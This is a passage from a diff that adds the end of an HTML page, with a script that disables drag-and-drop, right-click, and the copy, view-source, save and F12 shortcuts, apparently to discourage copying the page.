+  }
+</style>
+
+
+<script>
+  // Disable drag & drop
+  document.addEventListener("dragstart", function (e) {
+    e.preventDefault();
+  });
+
+  document.addEventListener("drop", function (e) {
+    e.preventDefault();
+  });
+
+  document.addEventListener("dragover", function (e) {
+    e.preventDefault();
+  });
+
+  // Disable right-click (optional)
+  document.addEventListener("contextmenu", function (e) {
+    e.preventDefault();
+  });
+
+  // Disable text selection via keyboard
+  document.addEventListener("keydown", function (e) {
+    if (
+      (e.ctrlKey && ["a", "c", "x", "u", "s"].includes(e.key.toLowerCase())) ||
+      e.key === "F12"
+    ) {
+      e.preventDefault();
+    }
+  });
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
